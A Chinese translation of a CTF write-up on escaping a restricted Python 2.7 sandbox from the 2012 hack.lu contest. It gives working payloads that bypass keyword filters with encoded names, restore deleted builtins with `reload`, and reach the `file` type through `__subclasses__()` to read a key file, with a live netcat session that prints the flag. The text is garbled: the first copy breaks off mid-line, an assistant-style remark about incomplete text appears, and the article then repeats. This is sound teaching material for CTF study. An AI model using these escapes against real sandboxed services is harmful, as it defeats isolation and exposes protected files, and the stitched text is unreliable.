# 【技术分享】从一个CTF题目学习Python沙箱逃逸

#### 译文声明
本文是翻译文章，原文来源：[isis.poly.edu](http://isis.poly.edu)。译文仅供参考，具体内容和含义请以原文为准。

**翻译者**：[beswing](http://bobao.360.cn/member/contribute?uid=820455891)  
**预估稿费**：190 RMB  
**投稿方式**：发送邮件至 [linwei#360.cn](mailto:linwei#360.cn)，或登录[网页版](http://bobao.360.cn/contribute/index) 在线投稿

## 前言
作为一名CTF爱好者和二进制安全选手，在参与国外的CTF比赛时，我总能学到很多东西。最近，我和一些资深选手一起参加了一场国际CTF比赛，遇到了一道需要在Python沙箱中实现逃逸并获取flag的Pwn题目。在搜索解决方案的过程中，我发现了一篇非常有价值的博客文章。

## 正文
**注意**：本文针对的是Python 2.7.3版本。其他版本的Python（特别是Python 3）可能会有所不同！

尝试逃离沙箱总是一个有趣的挑战，Python沙箱也不例外。在静态语言中，通常通过分析代码来检查是否调用了某些函数，或者用经过验证的代码包装危险函数来实现沙箱。然而，在动态语言（如Python）中，这变得更加具有挑战性。

一种简单的沙箱方法是扫描脚本内容，查找特定的关键字或函数，例如`eval`、`exec`、`execfile`和`import`。这种方法很容易被编码绕过。根据[PEP-0263](http://www.python.org/dev/peps/pep-0263/)，只要在脚本的前两行之一中包含`# coding:`指令，Python解释器将按照指定的编码解析整个脚本。

```python
# coding: rot_13
# "import evil_module" encoded in ROT13
'vzcbeg rivy_zbqhyr'
```

显然，我们需要一种更好的方法来进行逃逸。但在深入探讨之前，我们需要了解一些背景知识。

### 背景知识
- `dir()`：可以用来检查Python对象。不带参数时，返回当前本地作用域中的名称列表；带参数时，返回该对象的有效属性列表。
- `type()`：传入一个参数，返回对象的类型。一旦知道对象的存在，使用`type()`可以帮助我们更好地理解它。

执行开始时，以下对象在本地作用域中：

```python
>>> dir()
['__builtins__', '__doc__', '__name__', '__package__']
```

其中，`__builtins__`是最有趣的。我们可以查看其类型：

```python
>>> type(__builtins__)
<type 'module'>
```

根据Python语言参考，模块对象有一个由字典对象实现的命名空间。属性引用被转换为这个字典中的查找，例如`m.x`等同于`m.__dict__["x"]`。现在，我们可以通过运行`dir(__builtins__)`来检查内置函数。这个列表很长，包含了所有内置类型和函数。

### 尝试攻击
假设我们无法改变整个文件的编码，但仍然可以通过访问模块的底层字典，并使用变量访问所需的函数来对单个函数调用的名称进行编码。例如，导入`os`模块：

```python
>>> import base64
>>> base64.b64encode('__import__')
'X19pbXBvcnRfXw=='
>>> base64.b64encode('os')
'b3M='
```

将其放在一起：

```python
>>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base6是中国
看起来您提供的文本有一部分没有完整复制过来。为了更好地帮助您优化文本，请提供完整的段落或句子。以下是根据现有内容优化的部分：

# 【技术分享】从一个CTF题目学习Python沙箱逃逸

#### 译文声明
本文是翻译文章，原文来源：[isis.poly.edu](http://isis.poly.edu)。译文仅供参考，具体内容和含义请以原文为准。

**翻译者**：[beswing](http://bobao.360.cn/member/contribute?uid=820455891)  
**预估稿费**：190 RMB  
**投稿方式**：发送邮件至 [linwei#360.cn](mailto:linwei@360.cn)，或登录[网页版](http://bobao.360.cn/contribute/index) 在线投稿

## 前言
作为一名CTF爱好者和二进制安全选手，在参与国外的CTF比赛时，我总能学到很多东西。最近，我和一些资深选手一起参加了一场国际CTF比赛，遇到了一道需要在Python沙箱中实现逃逸并获取flag的Pwn题目。在搜索解决方案的过程中，我发现了一篇非常有价值的博客文章。

## 正文
**注意**：本文针对的是Python 2.7.3版本。其他版本的Python（特别是Python 3）可能会有所不同！

尝试逃离沙箱总是一个有趣的挑战，Python沙箱也不例外。在静态语言中，通常通过分析代码来检查是否调用了某些函数，或者用经过验证的代码包装危险函数来实现沙箱。然而，在动态语言（如Python）中，这变得更加具有挑战性。

一种简单的沙箱方法是扫描脚本内容，查找特定的关键字或函数，例如`eval`、`exec`、`execfile`和`import`。这种方法很容易被编码绕过。根据[PEP-0263](http://www.python.org/dev/peps/pep-0263/)，只要在脚本的前两行之一中包含`# coding:`指令，Python解释器将按照指定的编码解析整个脚本。

```python
# coding: rot_13
# "import evil_module" encoded in ROT13
'vzcbeg rivy_zbqhyr'
```

显然，我们需要一种更好的方法来进行逃逸。但在深入探讨之前，我们需要了解一些背景知识。

### 背景知识
- `dir()`：可以用来检查Python对象。不带参数时，返回当前本地作用域中的名称列表；带参数时，返回该对象的有效属性列表。
- `type()`：传入一个参数，返回对象的类型。一旦知道对象的存在，使用`type()`可以帮助我们更好地理解它。

执行开始时，以下对象在本地作用域中：

```python
>>> dir()
['__builtins__', '__doc__', '__name__', '__package__']
```

其中，`__builtins__`是最有趣的。我们可以查看其类型：

```python
>>> type(__builtins__)
<type 'module'>
```

根据Python语言参考，模块对象有一个由字典对象实现的命名空间。属性引用被转换为这个字典中的查找，例如`m.x`等同于`m.__dict__["x"]`。现在，我们可以通过运行`dir(__builtins__)`来检查内置函数。这个列表很长，包含了所有内置类型和函数。

### 尝试攻击
假设我们无法改变整个文件的编码，但仍然可以通过访问模块的底层字典，并使用变量访问所需的函数来对单个函数调用的名称进行编码。例如，导入`os`模块：

```python
>>> import base64
>>> base64.b64encode('__import__')
'X19pbXBvcnRfXw=='
>>> base64.b64encode('os')
'b3M='
```

将其放在一起：

```python
>>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))
<module 'os' from '/usr/lib/python2.7/os.pyc'>
```

通过这种方式，我们可以绕过基于字符串检查的沙箱。

接下来，让我们考虑另一种方法，即基于修改`__builtins__.__dict__`。因为`__builtins__.__dict__`是一个代表所有可用内置函数的字典，如果我们修改其中一个条目，就可以改变环境的可用功能。

例如，`abs`函数返回数字的绝对值：

```python
>>> abs(-1)
1
```

现在，让我们删除`abs`函数：

```python
>>> __builtins__.__dict__['abs'] = None
>>> abs(-1)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: 'NoneType' object is not callable
```

或者直接删除`abs`：

```python
>>> del __builtins__.__dict__['abs']
>>> abs(-1)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'abs' is not defined
```

我们刚刚删除了环境中调用`abs`的能力！因此，现在我们有另一种处理Python沙箱的方法——删除许多“危险”的内置函数。

让我们做一个小的危险函数列表：

```python
>>> del __builtins__.__dict__['__import__']  # __import__ 是由 import 语句调用的函数
>>> del __builtins__.__dict__['eval']        # 评估代码可能很危险
>>> del __builtins__.__dict__['execfile']    # 执行文件内容也可能很危险
>>> del __builtins__.__dict__['input']       # 获取用户输入并评估可能很危险
```

这看起来有点安全，对吧？

```python
>>> import os
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ImportError: __import__ not found
```

等等！还有一个`reload`函数可以重新加载导入的模块，并执行代码，所以模块会被重新导入到我们的命名空间中：

```python
>>> reload(__builtins__)
<module '__builtin__' (built-in)>
>>> import os
>>> dir(os)
```

我们必须将其添加到列表中：

```python
>>> del __builtins__.__dict__['reload']  # 他们可能会重新加载 __builtins__！
```

好，现在我们有一个更安全的方法，对吧？我们阻止了沙箱中的任何人使用危险的内置命令，并且我们可以通过不允许他们对整个文件进行编码和扫描内容来阻止他们使用`eval`关键字。希望我们已经删除了所有危险的内置函数。

让我们重温一下[2012.hack.lu](http://2012.hack.lu/index.php/CaptureTheFlag)的比赛题目，在这次挑战中，你需要读取`./key`文件的内容。他们首先通过删除引用来销毁打开文件的内置函数。然后它们允许您执行用户输入。看看他们的代码稍微修改的版本：

```python
def make_secure():
    UNSAFE = ['open',
              'file',
              'execfile',
              'compile',
              'reload',
              '__import__',
              'eval',
              'input']
    for func in UNSAFE:
        del __builtins__.__dict__[func]

from re import findall

# 删除危险的内置函数
make_secure()
print 'Go Ahead, Exploit me >;D'

while True:
    try:
        # 读取用户输入直到第一个空白字符
        inp = findall(r'\S+', raw_input())[0]
        a = None
        # 设置a为执行用户输入的结果
        exec 'a=' + inp
        print 'Return Value:', a
    except Exception as e:
        print 'Exception:', e
```

由于我们没有在`__builtins__`中引用`file`和`open`，常规的编码技巧是行不通的。但是也许我们可以在Python解释器中挖掘出另一种代替`file`或`open`引用的方法。

### 深入一点
对于这一部分，我要感谢[Ned Batchelder](http://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)的分享。今年夏天我读了他的博客，其中有一篇文章详细说明了`eval`函数的危险性，并在其代码中进一步演示了`eval()`函数滥用的危险性。

将一个对象传入`type()`函数将返回一个`type`对象。例如：

```python
>>> type([1, 2, 3])
<type 'list'>
```

现在，让我们开始检查一个元组的字段：

```python
>>> type(().__class__)
<type 'type'>
```

这涉及到元类和元类型的详细信息。更多内容见[PEP 0253](http://www.python.org/dev/peps/pep-0253/)。让我们忽略这些细节，深入一点。

根据文档，新式类有一些特殊的属性。具体来说，`__bases__`包含“基类，按它们在基类列表中出现的顺序”。`class.subclasses()`返回所有子类的列表。

让我们来看看我们的元组：

```python
>>> ().__class__.__bases__
(<type 'object'>,)
```

它直接从`object`继承。我们不知道还有什么：

```python
>>> ().__class__.__bases__[0].__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, ...]
```

我们在这里找到了我们需要的一切！然后我可以使用一些简单的行在列表中找到`file`的索引：

```python
>>> all_classes = []
>>> for entry in ().__class__.__bases__[0].__subclasses__():
...     all_classes.append(entry.__name__)
...
>>> all_classes.index("file")
40
```

我们不能在挑战中使用这段代码（甚至重写为列表解析），因为它包含空格。但由于`file`在索引40处，我们可以硬编码：

```python
>>> ().__class__.__bases__[0].__subclasses__()[40]
<type 'file'>
```

一旦我们引用了文件，我们所需要做的就是创建一个文件对象并读取它：

```python
>>> ().__class__.__bases__[0].__subclasses__()[40]("./key").read()
"This works"
```

所以解决题目的方法是：

```bash
moshe@moshe-desktop:~$ netcat ctf.fluxfingers.net 2045
Go Ahead, Exploit me >;D
().__class__.__bases__[0].__subclasses__()[40]("./key").read()
Return Value: FvibLF0eBkCBk
```

在旁注中，我们不需要在单个语句中执行——`exec`在当前上下文中运行代码，因此通过将每个命令的输出存储在变量（除了`a`之外），我们可以轻松地保持命令之间的状态。

```bash
moshe@moshe-desktop:~$ netcat ctf.fluxfingers.net 2045
Go Ahead, Exploit me >;D
x = 23
Return Value: 23
45
Return Value: 45
x
Return Value: 23
```

### 参考链接
另一个有用的资源是：
- Ned Batchelder的博文：[Eval Really Is Dangerous](http://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)

### 后记
我发现国内的比赛和国外的比赛在质量上确实有很大差异。国内很多比赛只是为了出题而出题，而国外的比赛虽然很难，但在攻克过程中总能学到很多有价值的知识。